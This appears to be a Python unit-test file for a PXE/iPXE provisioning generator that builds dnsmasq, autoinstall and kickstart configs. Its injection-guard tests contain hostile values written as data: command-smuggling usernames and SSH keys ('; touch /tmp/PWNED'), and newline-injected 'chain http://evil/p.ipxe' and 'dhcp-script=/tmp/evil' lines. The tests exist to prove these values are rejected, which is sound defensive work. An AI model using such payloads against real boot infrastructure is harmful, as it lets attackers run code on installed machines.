"""PXE 生成器单元测试。

说明（本次修订）：
  - `test_per_mac_files_and_hostname` / `test_rhel_kickstart` 为原有测试。
    P1 批次**有意改变**了它们覆盖的两种行为，故这两处断言已随行为同步更新，
    并各自**加强**（见下）：按 MAC 菜单改为 iPXE 第二阶段的互斥 tag 形式；
    RHEL 装机必须提供 mirror（本机不发布 ISO 仓库树，旧的 inst.repo 会指向 404）。
  - 原 `test_ubuntu_direct_uefi` 断言的是一套**已被替换掉的手写 curtin storage 结构**
    （`"ptable": "gpt"` 等）。那套结构实测有 11 处违反 curtin 官方硬规则
    （每个条目必须有 id；volgroup 必须用 id 而非名字；format.volume / mount.device 必须指向 id），
    且 `storage` 输出为列表而 autoinstall schema 要求对象。现改为断言官方 `layout` 简写。
  - 新增 3 个回归测试，覆盖此前长期逃逸的缺陷：
      * autoinstall 键名必须是连字符 `late-commands`
      * post_script 的 YAML + POSIX shell 双层语义
      * iPXE 菜单里的分号必须转义（否则 iPXE 会把 kernel 行切成两条命令导致装机失败）
"""
import shlex
import unittest

import yaml

from app.it.pxe.generator import PxeConfig, generate_all, pick_iso


def _cfg(**kw):
    """测试辅助：本文件测的是 post_script / storage / ipxe，不是口令策略。
    U10 之后 _hash_pw 对空口令抛 ValueError，故统一补一个测试口令。
    Ubuntu 分支现在**必须**有可挂载介质（casper 的 url=），否则显式失败；
    这里给一个默认测试 ISO，需要测"无介质"的用例自行传 iso_url=""。"""
    kw.setdefault("admin_password", "Test@123")
    kw.setdefault("iso_url", "http://10.0.0.1:8000/pxe/iso/test.iso")
    return PxeConfig(**kw)


class PxeGeneratorTest(unittest.TestCase):
    # ---------------- 原有测试：保持原样 ----------------

    def test_per_mac_files_and_hostname(self):
        cfg = _cfg(
            os_type="ubuntu",
            os_version="22.04",
            hostname="base-server",
            admin_user="ops",
            admin_password="Test@123",
            server_ip="10.10.10.10",
            http_root="http://10.10.10.10:8000/pxe/serve",
            net_mode="dhcp",
            deploy_mode="standalone",
        )
        installs = [
            {"mac": "00:11:22:33:44:55", "hostname": "web-01", "ip": "10.10.10.100"},
            {"mac": "AA:BB:CC:DD:EE:FF", "hostname": "db-01", "ip": "10.10.10.101"},
        ]
        files = generate_all(cfg, installs)
        self.assertIn("boot/00-11-22-33-44-55.ipxe", files)
        self.assertIn("boot/aa-bb-cc-dd-ee-ff.ipxe", files)
        self.assertIn("user-data/00-11-22-33-44-55/user-data", files)
        self.assertIn("hostname: web-01", files["user-data/00-11-22-33-44-55/user-data"])
        self.assertIn("- reboot", files["user-data/00-11-22-33-44-55/user-data"])
        self.assertIn("user-data/00-11-22-33-44-55/", files["boot/00-11-22-33-44-55.ipxe"])
        dns = files["dnsmasq.conf"]
        self.assertIn("dhcp-host=00:11:22:33:44:55,set:pxe_00-11-22-33-44-55", dns)
        # 按 MAC 的菜单属于【第二阶段】（iPXE 自己再次 DHCP 时），用互斥 tag 下发；
        # 旧写法 dhcp-boot=tag:pxe_<mac>,<菜单URL> 会把这个脚本 URL 交给 PXE 固件，
        # 而固件执行不了 iPXE 脚本，所以它被移除了。
        self.assertIn(
            "tag-if=set:fw-menu-00-11-22-33-44-55,"
            "tag:fw-menu,tag:pxe_00-11-22-33-44-55",
            dns,
        )
        self.assertIn(
            "dhcp-boot=tag:fw-menu-00-11-22-33-44-55,"
            "http://10.10.10.10:8000/pxe/serve/boot/00-11-22-33-44-55.ipxe",
            dns,
        )
        # 守护断言①：第一阶段（PXE 固件）必须拿二进制，绝不能拿到脚本 URL
        self.assertIn("dhcp-boot=tag:fw-x64,ipxe.efi", dns)
        self.assertIn("dhcp-boot=tag:fw-ia32,ipxe-i386.efi", dns)
        self.assertIn("dhcp-boot=tag:fw-bios,undionly.kpxe", dns)
        self.assertNotIn("dhcp-boot=tag:pxe_", dns)
        # 守护断言②：每条 dhcp-boot 只带一个 tag
        # （dnsmasq 未规定"多条同时匹配时哪条胜出"，故设计上不依赖该优先级）
        for line in dns.splitlines():
            if line.startswith("dhcp-boot="):
                self.assertEqual(line.split(",")[0].count("tag:"), 1, line)

    def test_rhel_kickstart(self):
        # D17：RHEL 装机必须给出可用的安装源。本机从不发布 ISO 仓库树
        # （extract_from_iso 只拷 vmlinuz/initrd.img，目录里没有 repomd.xml），
        # 所以"没有 mirror 就指向 http_root/os"只会产出一个 404 的 inst.repo。
        cfg = _cfg(os_type="rhel", os_version="9.3", hostname="rhel-01", admin_password="x",
                   mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        files = generate_all(cfg)
        self.assertIn("ks.cfg", files)
        self.assertIn("url --url=", files["ks.cfg"])
        self.assertIn("reboot", files["ks.cfg"])
        # inst.repo 原样使用 mirror，且不再出现【臆造的 http_root + "/os"】形式。
        # 注意不能断言 assertNotIn("/os", ...)：mirror 自己的路径就可能以 /os 结尾。
        self.assertEqual(files["boot.ipxe"].count("inst.repo="), 1, files["boot.ipxe"])
        self.assertIn("inst.repo=http://mirror.example/rocky/9/BaseOS/x86_64/os/",
                      files["boot.ipxe"])
        self.assertNotIn(":8000/pxe/os", files["boot.ipxe"])

    def test_rhel_without_mirror_is_rejected(self):
        """D17 守护：无 mirror 的 RHEL 装机必须显式失败，而不是产出坏 inst.repo。

        生产上 8 个 profile 全是 ubuntu，故此行为变更不影响任何现存部署；
        这里把它钉住，避免以后有人把"静默产出 404 URL"加回来。
        """
        cfg = _cfg(os_type="rhel", os_version="9.3", hostname="rhel-01", admin_password="x")
        with self.assertRaises(ValueError) as ctx:
            generate_all(cfg)
        self.assertIn("mirror", str(ctx.exception))

    # ---------------- storage：改为断言官方 layout 简写 ----------------

    def test_ubuntu_storage_layout(self):
        """storage 必须是对象，且用官方 layout 简写（不再是手写的 curtin config 列表）。"""
        # direct
        doc = yaml.safe_load(generate_all(_cfg(disk_scheme="direct"))["user-data"])
        storage = doc["autoinstall"]["storage"]
        self.assertIsInstance(storage, dict, "storage 必须是 dict，不能是 list")
        self.assertEqual(storage["layout"]["name"], "direct")

        # 默认（lvm）
        doc = yaml.safe_load(generate_all(_cfg())["user-data"])
        storage = doc["autoinstall"]["storage"]
        self.assertIsInstance(storage, dict)
        self.assertEqual(storage["layout"]["name"], "lvm")
        self.assertNotIn("match", storage["layout"], "未指定磁盘时不应生成 match")

        # 非法值回退 lvm
        doc = yaml.safe_load(generate_all(_cfg(disk_scheme="unknown-xyz"))["user-data"])
        self.assertEqual(doc["autoinstall"]["storage"]["layout"]["name"], "lvm")

        # 指定磁盘 -> match.path
        doc = yaml.safe_load(
            generate_all(_cfg(disk_config={"disk": "vda"}))["user-data"]
        )
        self.assertEqual(
            doc["autoinstall"]["storage"]["layout"]["match"]["path"], "/dev/vda"
        )

    # ---------------- 回归：late-commands 键名 ----------------

    def test_autoinstall_late_commands_key_is_hyphenated(self):
        """键名必须是官方连字符写法。

        回归背景：曾用下划线 `late_commands`，官方 schema 里不存在该键，
        在 Ubuntu 22.04 上会被静默忽略，导致 post_script 与
        `systemctl enable ssh` 都不执行；24.04+ 会直接校验失败。
        """
        doc = yaml.safe_load(generate_all(_cfg())["user-data"])
        ai = doc["autoinstall"]
        self.assertIn("late-commands", ai)
        self.assertNotIn("late_commands", ai)

        cmds = ai["late-commands"]
        self.assertIsInstance(cmds, list)
        self.assertTrue(
            any("systemctl enable ssh" in c for c in cmds if isinstance(c, str)),
            "late-commands 中应含 systemctl enable ssh",
        )
        self.assertTrue(
            any(c.strip() == "reboot" for c in cmds if isinstance(c, str)),
            "late-commands 中应含 reboot",
        )

    # ---------------- 回归：post_script 双层语义 ----------------

    def _post_script_entries(self, doc):
        """取出 late-commands 里所有承载 bash -c 的条目。"""
        return [
            item
            for item in doc["autoinstall"]["late-commands"]
            if isinstance(item, str) and "bash -c " in item
        ]

    def _script_from_entry(self, entry):
        """把 'curtin ... bash -c <quoted>' 里的脚本按 POSIX 规则还原成参数列表。"""
        payload = entry.split("bash -c ", 1)[1]
        return shlex.split(payload)

    def test_post_script_round_trip(self):
        """post_script 必须同时通过 YAML 层与 POSIX shell 层。

        判据用「往返比较」而非子串匹配：正确的 POSIX 单引号引用必然在撇号处
        断开字面量（`echo "it's ok"` 引用后形如 `'echo "it"'\"'\"'s ok"'`），
        因此不可能出现连续的 `it's` 子串。
        """
        cases = [
            "echo hello",
            "echo \"it's ok\"",
            "echo 'quoted'",
            "touch /tmp/a\nmkdir -p /opt/b",
            "echo done: ok  # 注释",
            "echo C:\\temp\\x",
            "echo $HOME `whoami`",
        ]
        for script in cases:
            with self.subTest(script=script):
                cfg = _cfg(admin_password="Test@123", post_script=script)
                # YAML 层：整份 user-data 必须可解析，且该项是 str（不是 dict）
                doc = yaml.safe_load(generate_all(cfg)["user-data"])
                entries = self._post_script_entries(doc)
                self.assertEqual(len(entries), 1, f"应恰好有一个 bash -c 条目: {script!r}")
                entry = entries[0]
                self.assertIsInstance(entry, str)

                # 多行脚本：条目里必须含真实换行符，而不是字面的 \n 两个字符
                if "\n" in script:
                    self.assertIn("\n", entry, "多行脚本的条目应含真实换行")

                # shell 层：POSIX 还原后必须与原始脚本逐字相等
                self.assertEqual(self._script_from_entry(entry), [script])

    def test_post_script_empty_produces_two_commands(self):
        """未提供 post_script 时，late-commands 只有 systemctl enable ssh 与 reboot。"""
        doc = yaml.safe_load(generate_all(_cfg(post_script=""))["user-data"])
        cmds = doc["autoinstall"]["late-commands"]
        self.assertEqual(len(cmds), 2)
        self.assertIn("systemctl enable ssh", cmds[0])
        self.assertEqual(cmds[1], "reboot")
        self.assertEqual(self._post_script_entries(doc), [], "空脚本不应产生 bash -c 条目")

    # ---------------- 回归：iPXE 分号转义 ----------------

    def test_admin_user_and_ssh_key_cannot_inject(self):
        """admin_user 会落进 ks 的 %post（**以 root 执行**）与 autoinstall 的 YAML；
        ssh_keys 原先用 ' + chr(39) + ' 手工拼单引号。两者都必须无法注入。

        判据用 **POSIX 分词**而不是子串检查：
          · _safe_username 是"剔除"而非"拒绝"，所以字符串里可能还留着载荷片段，
            但一个字符都逃不出用户名；
          · shlex.quote 产出的 `; touch` 仍在**单引号内部**，不构成命令。
        子串存在 ≠ 可执行 —— 这一点我第一版判错过。
        """
        import shlex

        def toks(line):
            lx = shlex.shlex(line, posix=True, punctuation_chars=";&|<>()")
            lx.whitespace_split = True
            return list(lx)

        cfg = _cfg(os_type="rhel", os_version="9", hostname="r1",
                   admin_user="ops; touch /tmp/PWNED #",
                   mirror="http://m/rocky9/",
                   ssh_keys=["ssh-ed25519 AAAA' ; touch /tmp/PWNED_KEY ; echo ' x"])
        ks = generate_all(cfg)["ks.cfg"]
        for line in ks.splitlines():
            if "home/" not in line:
                continue
            t = toks(line)
            self.assertNotIn(";", t, line)
            self.assertNotIn("touch", t, line)
        user_line = next(l for l in ks.splitlines() if l.startswith("user "))
        self.assertRegex(user_line.split("--name=")[1].split()[0], r"^[A-Za-z0-9_-]+$")

        ucfg = _cfg(os_type="ubuntu",
                    admin_user="ops\n    groups: [sudo]\n    lock_passwd: false")
        import yaml
        ident = yaml.safe_load(generate_all(ucfg)["user-data"])["autoinstall"]["identity"]
        self.assertNotIn("groups", ident)
        self.assertNotIn("lock_passwd", ident)
        self.assertRegex(ident["username"], r"^[A-Za-z0-9_-]+$")


    def test_listen_ports_from_proc_fallback(self):
        """容器镜像没有 iproute2（`ss` 不存在），而容器是 host 网络模式，
        所以 /server/status 的 ports 必须能从 /proc/net/udp{,6} 回退解析。

        夹具是宿主机 /proc 的真实片段，覆盖三个坑：
          · IPv4 地址是 hex 且按**主机字节序**（7176800A -> 10.128.118.113）
          · IPv6 是 32 位 hex，每 4 字节一组也要按小端还原（...01000000 -> ::1）
          · dnsmasq 会开多个 socket，必须去重；无关端口（0016=22）必须忽略
        用 mock 喂内容，不落任何临时文件。
        """
        import builtins
        import io
        from unittest import mock

        from app.it.pxe.server import _listen_ports_from_proc

        udp = (
            "  sl  local_address rem_address   st\n"
            " 4736: 00000000:0043 00000000:0000 07\n"
            " 4736: 00000000:0043 00000000:0000 07\n"
            " 4738: 0100007F:0045 00000000:0000 07\n"
            " 4738: 7176800A:0045 00000000:0000 07\n"
            " 4736: 00000000:0016 00000000:0000 07\n"
        )
        udp6 = (
            "  sl  local_address                         remote_address   st\n"
            " 4738: 00000000000000000000000001000000:0045 0000:0000 07\n"
            " 4738: 01000000:0045 0000:0000 07\n"
        )

        def fake_open(path, *a, **k):
            return io.StringIO(udp6 if str(path).endswith("udp6") else udp)

        with mock.patch.object(builtins, "open", fake_open):
            got = _listen_ports_from_proc("/proc/net/udp", "/proc/net/udp6")
        self.assertEqual(got, ["0.0.0.0:67", "10.128.118.113:69", "127.0.0.1:69", "[::1]:69"])

        # 坏输入必须安全返回空，而不是抛异常
        for bad in ("", "  sl  local_address\n", "4736:\n",
                    " 4736: 00000000:ZZZZ 0 0 07\n"):
            with mock.patch.object(builtins, "open",
                                   lambda *a, **k: io.StringIO(bad)):
                self.assertEqual(_listen_ports_from_proc("/x", "/y"), [])


    def test_ipxe_menu_ubuntu_uses_cloud_config_url(self):
        """Ubuntu 的 kernel 行必须用 cloud-config-url 投递应答文件，并给出可挂载的 url=。

        这里断言的是**真机实测结论**，不是推测：
        - 旧写法 `ds=nocloud-net\\;s=<seed>`：iPXE 不认反斜杠转义，`\\;` 会以字面反斜杠
          进入内核命令行（内核串口实证：'Kernel command line: ... ds=nocloud\\;s=http://...'），
          cloud-init 的 DataSourceNoCloud.parse_cmdline_data() 要求精确子串 " ds=nocloud;"，
          于是失配 → 数据源退化成 none → 安装器进交互模式，autoinstall 永不生效。
        - 旧写法把相对位置参数 `--- <squashfs_path>` 当介质：casper 实测报
          "Unable to find a medium containing a live file system"。
        - cloud-init 自己也会解析 `url=`（parse_cmdline_url 在 ("cloud-config-url","url")
          里取第一个命中的键）。只写 url=<ISO> 时它把 2GB ISO 当配置文件流式下载进内存，
          实测 3.66GB anon RSS → cloud-init 被 OOM 杀，local/network 两个 stage 全 FAILED。
          所以 cloud-config-url 必须与 url= 同时在场。
        """
        menu = generate_all(_cfg(server_ip="10.0.0.1",
                                 http_root="http://10.0.0.1:8000/pxe/serve"))["boot.ipxe"]
        klines = [l for l in menu.splitlines() if l.startswith("kernel")]
        self.assertEqual(len(klines), 1)
        k = klines[0]

        self.assertIn("autoinstall", k)
        self.assertIn("cloud-config-url=http://10.0.0.1:8000/pxe/serve/user-data", k)
        self.assertIn("ip=dhcp", k)
        self.assertIn("url=http://10.0.0.1:8000/pxe/iso/test.iso", k)
        # 默认必须带串口：无显示器的机器装机失败时，串口是唯一能看到真实 cmdline / OOM /
        # curtin 卡在哪一步的地方（本项目就是靠它定案的）
        self.assertIn("console=tty0 console=ttyS0,115200", k)

        # 置空则完全不带 console=（保留给坚持把界面留在显示器上的场景）
        k2 = [l for l in generate_all(_cfg(kernel_console=""))["boot.ipxe"].splitlines()
              if l.startswith("kernel")][0]
        self.assertNotIn("console=", k2)

        # UEFI 必需：kernel 行上要给出 initrd 的名字（必须与 iPXE 注册的 basename 一致）。
        # 不带它时 UEFI(OVMF) 下内核 panic "Cannot open root device ram0"，
        # 而 BIOS 下它是 NO-OP。实测见 pve_verify_uefi.py。
        self.assertIn("initrd=initrd", k)

        # 不得再出现必然失配的转义分号写法，也不得再用相对位置介质参数
        self.assertNotIn("\\", k, "kernel 行不应含反斜杠转义")
        self.assertNotIn("nocloud", k, "Ubuntu 不再走 ds=nocloud 数据源探测")
        self.assertNotIn(" --- ", k, "不得再用相对位置介质参数")

        # 我们已经不需要分号了：iPXE 脚本里不应出现裸分号（它是命令分隔符）
        for line in menu.splitlines():
            self.assertNotIn(";", line, f"iPXE 行不应含分号: {line!r}")

    def test_per_mac_boot_uses_per_mac_seed(self):
        """每台机器的菜单必须指向自己的应答文件，而不是共享根目录的。"""
        cfg = _cfg(server_ip="10.10.10.10",
                   http_root="http://10.10.10.10:8000/pxe/serve")
        files = generate_all(cfg, [{"mac": "00:11:22:33:44:55", "hostname": "web-01"}])
        k = [l for l in files["boot/00-11-22-33-44-55.ipxe"].splitlines()
             if l.startswith("kernel")][0]
        self.assertIn(
            "cloud-config-url=http://10.10.10.10:8000/pxe/serve/user-data/00-11-22-33-44-55/user-data",
            k,
        )

    def test_ssh_enable_is_tolerant_and_ssh_pkg_added(self):
        """`systemctl enable ssh` 必须容错，且配了 ssh_keys 就要装 openssh-server。

        回归背景（真机实测）：22.04 live-server 最小安装里没有 ssh 单元，
        这条 late-command 返回 1，curtin 把**已经装好的系统**判成 install_fail，
        界面停在 "An error occurred"，其后的 `reboot` 也再也执行不到。
        """
        doc = yaml.safe_load(generate_all(_cfg(ssh_keys=["ssh-ed25519 AAAATEST k"]))["user-data"])
        ai = doc["autoinstall"]
        lc = ai["late-commands"]
        ssh_cmds = [c for c in lc if "systemctl enable ssh" in c]
        self.assertEqual(len(ssh_cmds), 1)
        self.assertIn("|| true", ssh_cmds[0], "ssh 启用必须容错，否则装机被误判失败")
        # reboot 必须仍在最后，且一定在 ssh 之后
        self.assertEqual(lc[-1], "reboot")
        self.assertLess(lc.index(ssh_cmds[0]), lc.index("reboot"))
        # 配了 authorized-keys 就必须把包也装上
        self.assertIn("openssh-server", ai.get("packages", []))

    def test_rhel_kernel_line_has_initrd_name(self):
        """RHEL 分支同样要带 `initrd=`，名字取自 initrd_path 的 basename（UEFI 必需、BIOS NO-OP）。"""
        cfg = _cfg(os_type="rhel", os_version="9", initrd_path="rhel/9/initrd.img",
                   mirror="http://mirror.example/rocky/9/BaseOS/x86_64/os/")
        k = [l for l in generate_all(cfg)["boot.ipxe"].splitlines() if l.startswith("kernel")][0]
        self.assertIn("initrd=initrd.img", k)
        self.assertIn("inst.ks=", k)

    def test_readme_states_memory_requirement(self):
        """README 必须写明内存要求与原因（casper 走 HTTP 会把整份 ISO 读进内存）。

        这是被真实踩过的坑：目标机内存不够时表现为装机中途 OOM，而不是清晰的报错。
        """
        txt = generate_all(_cfg(iso_size_mb=2038))["README.txt"]
        self.assertIn("2038", txt)          # ISO 大小
        self.assertIn("3574", txt)          # 2038 + 1536 的建议内存
        self.assertIn("cloud-config-url", txt)   # 并说明为什么要同时给它

    def test_user_data_has_cloud_config_header(self):
        """`#cloud-config` 头现在是有承重作用的：cloud-config-url 投递的配置必须以此开头，
        cloud-init 才会认（cmd/main.py 会嗅探该头）；去掉它整条自动安装链路会静默失效。"""
        files = generate_all(_cfg(), [{"mac": "00:11:22:33:44:55", "hostname": "web-01"}])
        for key in ("user-data", "user-data/00-11-22-33-44-55/user-data"):
            self.assertTrue(files[key].startswith("#cloud-config"), key)
            self.assertIn("autoinstall:", files[key], key)

    def test_ubuntu_requires_mountable_media(self):
        """没有可用介质时必须显式失败（映射成 4xx 可读提示），而不是生成必然失败的菜单。"""
        with self.assertRaises(ValueError) as cm:
            generate_all(_cfg(iso_url=""))
        self.assertIn("iso_url", str(cm.exception))

    def test_pick_iso_picks_right_image(self):
        """正式环境同一目录会有多个系统镜像，必须按 os_type/os_version 挑准。"""
        names = ["ubuntu-22.04.5-live-server-amd64.iso",
                 "ubuntu-24.04.1-live-server-amd64.iso",
                 "Rocky-9.4-x86_64-minimal.iso",
                 "centos-7-x86_64-minimal.iso",
                 "README.txt", "download-complete.flag"]
        self.assertEqual(pick_iso(names, "ubuntu", "22.04"),
                         "ubuntu-22.04.5-live-server-amd64.iso")
        self.assertEqual(pick_iso(names, "ubuntu", "24.04"),
                         "ubuntu-24.04.1-live-server-amd64.iso")
        self.assertEqual(pick_iso(names, "rhel", "9"),
                         "Rocky-9.4-x86_64-minimal.iso")
        # 挑不到就返回空串，由调用方给出可读错误（不猜一个错的镜像）
        self.assertEqual(pick_iso(names, "ubuntu", "20.04"), "")
        self.assertEqual(pick_iso([], "ubuntu", "22.04"), "")


class PxeInjectionGuardTest(unittest.TestCase):
    """iPXE / dnsmasq 配置注入防护。

    外部代码审查（MiMo v2.6 Pro）提出后，已用机械方式复现确认为真：
    改前 `iso_url="http://x/y.iso\\nchain http://evil/p.ipxe"` 会让生成的 boot.ipxe
    多出一行 `chain http://evil/p.ipxe`（裸机装机时执行攻击者脚本）；
    `http_root="http://x\\ndhcp-script=/tmp/evil"` 会往 dnsmasq.conf 注入
    `dhcp-script=...`，而该配置由**宿主 root dnsmasq** 加载。
    """

    INJ = "http://x/y.iso" + chr(10) + "chain http://evil/p.ipxe"

    def test_schema_rejects_newline_in_generate_body(self):
        """第 2 层：请求体里带换行的字段必须被 422 拒掉，而不是拼进脚本。"""
        from pydantic import ValidationError

        from app.core.schemas import PxeGenerateIn

        for field in ("iso_url", "http_root", "kernel_path", "initrd_path",
                      "squashfs_path", "kernel_console"):
            with self.assertRaises(ValidationError, msg="字段 " + field):
                PxeGenerateIn(**{field: "a" + chr(10) + "b"})

    def test_generator_rejects_control_chars(self):
        """第 3 层：绕过 HTTP 层直接调 generate_all，也必须注入不进去。"""
        cases = [
            {"iso_url": self.INJ},
            {"http_root": "http://10.0.0.1" + chr(10) + "dhcp-script=/tmp/evil"},
            {"kernel_path": "vmlinuz" + chr(10) + "chain http://evil/x"},
            {"kernel_console": "console=tty0" + chr(10) + "chain http://evil/x"},
            {"mirror": "http://m/" + chr(10) + "rootpw x"},      # 进 YAML 与 kickstart
            {"timezone": "UTC" + chr(10) + "late-commands:"},     # 进 YAML
            {"iso_url": "http://x/y.iso" + chr(13) + "chain http://evil/x"},  # CR 也要拦
            {"iso_url": "http://x/y.iso" + chr(9) + "chain http://evil/x"},   # TAB 也要拦
        ]
        for kw in cases:
            with self.assertRaises(ValueError, msg=str(kw)):
                generate_all(_cfg(**kw))

    def test_normal_values_not_broken(self):
        """正常值不能被误伤（否则等于用"安全"把功能打死）。"""
        files = generate_all(_cfg())
        self.assertIn("kernel ", files["boot.ipxe"])
        self.assertIn("user-data", files)
        self.assertIn("dhcp-boot=", files["dnsmasq.conf"])

    def test_pick_iso_version_boundary_and_precision(self):
        """版本按数字边界匹配；精度排序要真的生效。"""
        # 边界：查询 9 不能命中 19.4
        names = ["Rocky-19.4-x86_64-minimal.iso", "Rocky-9.4-x86_64-minimal.iso"]
        self.assertEqual(pick_iso(names, "rhel", "9"), "Rocky-9.4-x86_64-minimal.iso")
        # 精度：22.04 与 22.04.5 同时存在时，段数多的胜出
        # （旧实现 score 恒为查询版本的段数，两者平票，这条排序从未生效）
        two = ["ubuntu-22.04-live-server-amd64.iso",
               "ubuntu-22.04.5-live-server-amd64.iso"]
        self.assertEqual(pick_iso(two, "ubuntu", "22.04"),
                         "ubuntu-22.04.5-live-server-amd64.iso")
        # 22.04 的查询不能命中 24.04
        self.assertEqual(pick_iso(["ubuntu-24.04.1-live-server-amd64.iso"],
                                  "ubuntu", "22.04"), "")


class PxeIsoUrlTest(unittest.TestCase):
    """ISO 介质 URL 的编码与安全（外部代码审查提出，已独立复核为真）。"""

    def test_iso_url_percent_encodes_filename(self):
        """文件名含空格/非 ASCII 时必须百分号编码。

        不编码时 iPXE 的 kernel 行会在空格处**断开参数**：url= 只剩前半截，后半截变成
        多余的内核参数，casper 取不到介质 → "Unable to find a medium containing a live file system"。
        """
        from unittest import mock

        from app.api import pxe as api_pxe
        from app.it.pxe import server as pxe_server

        class _P:                       # 最小 profile 替身：_iso_url_for 只读这两个属性
            os_type = "ubuntu"
            os_version = "22.04"

        with mock.patch.object(pxe_server, "iso_names",
                               lambda: ["ubuntu 22.04 live.iso"]):
            url = api_pxe._iso_url_for(_P(), "10.0.0.1")

        self.assertEqual(url, "http://10.0.0.1:8000/pxe/iso/ubuntu%2022.04%20live.iso")
        self.assertNotIn(" ", url, "URL 里不能出现裸空格")
        # 反解回来必须是真实文件名 —— _iso_size_mb 就是靠它去 stat 的
        from urllib.parse import unquote
        self.assertEqual(unquote(url.rsplit("/", 1)[-1]), "ubuntu 22.04 live.iso")

    def test_iso_size_mb_rejects_bad_names(self):
        """空串与路径穿越必须返回 0，不能拿去 stat 任意路径。"""
        from app.api import pxe as api_pxe
        self.assertEqual(api_pxe._iso_size_mb(""), 0)
        self.assertEqual(api_pxe._iso_size_mb("http://h/pxe/iso/.."), 0)
        self.assertEqual(api_pxe._iso_size_mb("http://h/pxe/iso/."), 0)
        # 不存在的文件也必须是 0（不能抛）
        self.assertEqual(api_pxe._iso_size_mb("http://h/pxe/iso/nope-xyz.iso"), 0)


if __name__ == "__main__":
    unittest.main()
